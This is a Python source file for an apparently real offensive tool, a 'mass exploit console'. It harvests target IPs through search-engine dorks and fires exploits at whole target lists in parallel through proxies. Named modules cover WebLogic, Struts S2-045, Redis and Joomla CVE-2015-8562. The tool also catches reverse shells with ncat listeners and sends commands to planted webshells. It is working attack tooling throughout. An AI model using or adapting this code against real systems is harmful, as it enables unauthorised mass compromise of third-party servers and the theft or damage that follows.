#!/usr/bin/python3

'''
mass exploit console
by jm33-ng
'''

import sys
import os
import time
import subprocess
import signal
import traceback
import util.console as console
import util.colors as colors
import util.webshell as ws
import util.baidu as baidu
import util.exploits as ExecExp
from util.console import input_check

# mark home for our way back
init_dir = os.getcwd()
proxy_conf = str(init_dir) + '/data/proxy.conf'
proxy = True

# default target list
ip_list = 'data/ip_list.txt'


def debug_except():
    '''
    Display traceback?
    '''
    if input(colors.CYAN + '[?] Display traceback? [y/n] ').strip() == 'y':
        trace_back = traceback.format_exc()
        console.print_error(str(trace_back))


# kill process by name
def check_kill_process(pstring):
    '''
    not used anywhere, but might be useful anyway
    '''
    for line in os.popen("ps ax | grep " + pstring + " | grep -v grep"):
        fields = line.split()
        pid = fields[0]
        os.kill(int(pid), signal.SIGKILL)


def list_exp():
    '''
    list all executables under the root of your exploit dir
    '''
    def is_executable(path):
        return os.path.isfile(path) and os.access(path, os.X_OK)

    for root, _, files in os.walk('exploits'):
        paths = []
        for filename in files:
            path = './' + root + '/' + filename
            paths.append(path)
        for pathname in paths:
            poc = '/'.join(pathname.split('/')[2:])
            if len(pathname.split('/')) > 4:
                continue
            if is_executable(pathname):
                print(colors.BLUE + poc + colors.END)


def jexboss(cmd, exploit_path):
    '''
    planning for removal
    '''
    global proxy_conf
    try:
        cmd = cmd.split()
        try:
            args = cmd[1:]
            subprocess.call(['proxychains4', '-q', '-f',
                             proxy_conf, exploit_path] + args)
        except BaseException:
            subprocess.call(['python', exploit_path, '-h'])
    except BaseException as err:
        console.print_error(
            "[-] Error starting {}: ".format(exploit_path) + str(err))
        debug_except()


def execute(cmd):
    '''
    handles user input in console
    '''

    global proxy_conf
    global ip_list
    global init_dir
    cmd = str(cmd).lower().strip()
    if cmd == '':
        pass
    elif cmd == 'info':
        print(
            colors.CYAN +
            '[*] Init directory: {}\n[*] Target: {}\n[*] Proxy config: {}'.format(
                init_dir,
                ip_list,
                proxy_conf))
    elif cmd.startswith('target'):
        target = ''.join(cmd.split()[1:])
        print(colors.BLUE + '[i] Target changed to {}'.format(target))
        ip_list = 'data/' + target
    elif cmd == 'init' or cmd == 'i':
        print(colors.CYAN + '[*] Going back to init_dir...' + colors.END)
        os.chdir(init_dir)
    elif cmd.startswith('baidu'):
        try:
            command = cmd.strip().split()
            dork = command[1]
            count = int(command[2])
            os.chdir('output')
            print(colors.PURPLE + '[*] Searching on Baidu...' + colors.END)
            baidu.spider(dork, count)
        except BaseException as err:
            console.print_error('[-] Error with baidu: ' + str(err))
            debug_except()
    elif cmd == 'proxy':
        if not os.path.exists('data/ss.json'):
            console.print_error('[-] Please make sure \"data/ss.json\" exists')
        try:
            subprocess.Popen(['./tools/ss-proxy', '-c', './data/ss.json'],
                             stderr=subprocess.PIPE,
                             stdout=subprocess.PIPE,
                             shell=False)
        except BaseException as err:
            console.print_error(
                '[-] Error starting Shadowsocks proxy: ' + str(err))
            debug_except()
    elif cmd.startswith('webshell'):
        try:
            command = cmd.split()
            if command[1] == '-b':
                try:
                    ws.loadShells('webshell.list')
                    cmd = input(colors.CYAN + 'CMD >> ' + colors.END)
                    ws.broadcast(cmd)
                except BaseException as err:
                    console.print_error(
                        '[-] Error with webshell broadcasting: ' + str(err))
                    debug_except()
            else:
                pass
        except BaseException:
            if cmd == 'webshell':
                try:
                    ws.loadShells('webshell.list')
                    shell = input('[*] Select a shell: ').strip()
                    ws.ctrl(shell)
                except BaseException as err:
                    console.print_error('[-] Error with webshell: ' + str(err))
                    debug_except()
    elif cmd == 'redis':
        answ = input(
            '[*] Executing redis mass exploit against `targets`, proceed? [y/n] ')
        os.chdir('./exploits/redis/')
        if answ.lower() == 'y':
            subprocess.call(['proxychains4', '-q', '-f',
                             proxy_conf, 'python', 'massAttack.py'])
        else:
            pass
    elif cmd.startswith('google'):
        try:
            cmd = cmd.strip().split()
            dork = cmd[1]
            # well yes im a lazy guy
            subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
                             '--dork', dork, '--revshell=\'127.0.0.1\'', '--port=4444'])
        except BaseException as err:
            console.print_error(str(err))
            debug_except()
    elif cmd.startswith('jexboss'):
        jexboss(cmd, './exploits/jexboss/jexboss.py')
    elif cmd == 'q' or cmd == 'quit':
        check_kill_process('ss-proxy')
        sys.exit(0)
    elif cmd == 'h' or cmd == 'help' or cmd == '?':
        print(console.help_info)
    elif cmd == 'exploits':
        print(colors.CYAN + '[+] Available exploits: ' + colors.END)
        list_exp()
    elif cmd == 'z' or cmd == "zoomeye":
        try:
            os.chdir('./zoomeye')
            subprocess.call(['python', 'zoomeye.py'])
        except BaseException as err:
            console.print_error('[-] Cannot start zoomeye.py:\n' + str(err))
            debug_except()
    elif cmd == 'x' or cmd == 'clear':
        subprocess.call("clear")
    elif cmd == 'c' or cmd == 'reset':
        subprocess.call("reset")
    elif cmd == "attack" or cmd == "e":
        attack()
    else:
        try:
            print(
                colors.BLUE +
                colors.BOLD +
                "[*] Exec: " +
                colors.END +
                colors.GREEN +
                cmd +
                colors.END +
                '\n')
            os.system(cmd)
        except BaseException as err:
            console.print_error(
                "[-] Error executing shell command `{}`: ".format(cmd) + str(err))
            debug_except()


def attack():
    global proxy_conf
    global proxy
    if input_check('[?] Do you wish to use proxychains? [y/n] ', choices=['y', 'n']) == 'y':
        proxy = True
    else:
        proxy = False
    answ = input_check(
        '\n[?] Do you wish to use\n\n    [a] built-in exploits\n    [m] or launch your own manually?\n\n[=] Your choice: ', choices=['a', 'm'])
    if answ == 'a':
        print(
            colors.CYAN +
            colors.BOLD +
            '\n[?] Choose a module from: ' +
            colors.END +
            '\n')
        print(console.built_in)
        answ = input_check(
            '[=] Your choice: ',
            check_type=int,
            choices=['0',
                     '1',
                     '2',
                     '3',
                     '4'])
        if answ == '2':
            console.print_error("\n[-] Under development")
        elif answ == '1':
            console.print_error('\n[-] Under development')
        elif answ == '0':
            scanner(ExecExp.weblogic())
        elif answ == '3':
            scanner(ExecExp.s2_045())
        elif answ == '4':
            scanner(ExecExp.witbe())
        else:
            console.print_error('\n[-] Invalid input!')
    elif answ == 'm':
        print(
            colors.CYAN +
            colors.UNDERLINE +
            colors.BOLD +
            "\nWelcome, in here you can choose your own exploit\n" +
            colors.END)
        print(colors.CYAN + '[*] Here are available exploits:\n' + colors.END)
        list_exp()
        exploit = input(
            "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ").strip()
        jobs = int(
            input_check("[?] How many processes each time? ", check_type=int))
        custom_args = []
        answ = input_check(
            "[?] Do you need a reverse shell [y/n]? ", choices=['y', 'n'])
        if answ == 'y':
            lhost = input(
                "[*] Where do you want me to send shells? ").strip()
            lport = input_check(
                "[*] and at what port? (make sure you have access to that port) ",
                check_type=int)
            custom_args = ['-l', lhost, '-p', lport]
            answ = input_check(
                '[*] Do you need me to start a listener? [y/n] ', choices=['y', 'n'])
            if answ == 'y':
                print("\n[*] Spawning ncat listener in new window...\n")
                try:
                    subprocess.Popen(
                        args=[
                            "gnome-terminal",
                            "--command=ncat -nklvp " +
                            lport +
                            " -m 1000"],
                        shell=False,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)
                except BaseException:
                    print(
                        colors.YELLOW +
                        "[-] Could not launch our listener, do you have GNOME-Terminal installed?" +
                        colors.END +
                        '\n')
            else:
                print(
                    "[*] Okay, just make sure you receive the reverse shells\n")
        else:
            pass
        custom_args += input(
            "[*] args for this exploit (target IP is handled already) ").strip().split()
        exec_path = exploit.split('/')[1:]
        work_path = exploit.split('/')[:-1]
        delimtr = '/'
        exec_path = delimtr.join(exec_path)
        work_path = delimtr.join(work_path)
        delimtr = ' '
        print(
            colors.BLUE +
            '[*] Your exploit will be executed like\n' +
            colors.END,
            'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                exec_path),
            delimtr.join(custom_args))
        scanner_args = (
            exploit,
            work_path,
            exec_path,
            custom_args,
            jobs)
        scanner(scanner_args)
    else:
        console.print_error('[-] Invalid input')


def scanner(scanner_args):
    '''
    Execute exploit against given ip list
    '''
    global ip_list
    global proxy
    _, work_path, exec_path, custom_args, jobs = scanner_args[
        0], scanner_args[1], scanner_args[2], scanner_args[3], scanner_args[4]
    if proxy:
        e_args = [
            'proxychains4',
            '-q',
            '-f',
            proxy_conf,
            './' + exec_path]
    else:
        e_args = ['./' + exec_path]
    e_args += custom_args
    e_args += ['-t']
    target_list = open(init_dir + '/' + ip_list)
    os.chdir('./exploits/' + work_path)
    console.print_warning(
        '\n[!] DEBUG: ' + str(e_args) + '\nWorking in ' + os.getcwd())
    console.print_warning('\n[!] It might be messy, get ready!' + '\n')
    time.sleep(3)
    count = 0
    tested = count
    rnd = 1
    for line in target_list:
        target_ip = line.strip()
        progress = colors.BLUE + colors.BOLD + 'ROUND.' + \
            str(rnd) + colors.END + '  ' + colors.CYAN + colors.BOLD + \
            str(tested + 1) + colors.END + ' targets found\n'
        try:
            sys.stdout.write('\r' + progress)
            sys.stdout.flush()
        except KeyboardInterrupt:
            exit()
        count += 1
        tested += 1
        try:
            e_args += [target_ip]
            print(colors.CYAN + ' '.join(e_args) + colors.END + '\n')
            proc = subprocess.Popen(e_args)

            # continue to next target
            e_args.remove(target_ip)
            time.sleep(.1)

            if count == jobs or count == 0:
                count = 0
                rnd += 1
                _, _ = proc.communicate()
                if proc.returncode is not None:
                    proc.kill()
                continue
            sys.stdout.flush()
            os.system('clear')
        except BaseException:
            pass
    os.system('clear')
    os.chdir(init_dir)
    console.print_success('\n[+] All done!\n')
    print(console.intro)


def main():
    '''
    manage procedure
    '''
    global ip_list
    answ = str(
        input(
            colors.CYAN +
            '[?] Use ip_list.txt as target list? [y/n] ' +
            colors.END)).strip()
    if answ.lower() == 'n':
        os.system("ls data")
        ip_list = 'data/' + str(
            input(
                colors.CYAN +
                '[=] Choose your target IP list (must be in ./data) ')).strip()
        if ip_list == 'data/':
            ip_list = 'data/ip_list.txt'
    else:
        pass
    while True:
        try:
            cmd = input(
                colors.CYAN +
                colors.BOLD +
                colors.UNDERLINE +
                "\nmec" +
                colors.END +
                colors.CYAN +
                colors.BOLD +
                " > " +
                colors.END)
            try:
                execute(cmd)
            except (KeyboardInterrupt, EOFError, SystemExit):
                sys.exit(0)
        except KeyboardInterrupt:
            try:
                answ = input("\n[?] Are you sure to exit? [y/n] ")
            except KeyboardInterrupt:
                print("\n[-] Okay okay, exiting immediately...")
                check_kill_process('ss-proxy')
                sys.exit(0)
            if answ.lower() == 'y':
                check_kill_process('ss-proxy')
                sys.exit(0)
            else:
                continue


if __name__ == "__main__":
    try:
        print(console.intro)
        main()
    except (EOFError, KeyboardInterrupt, SystemExit):
        console.print_error('[-] Exiting...')
    else:
        console.print_error(
            "[-] Seems like you\'ve encountered an unhandled exception")
        debug_except()
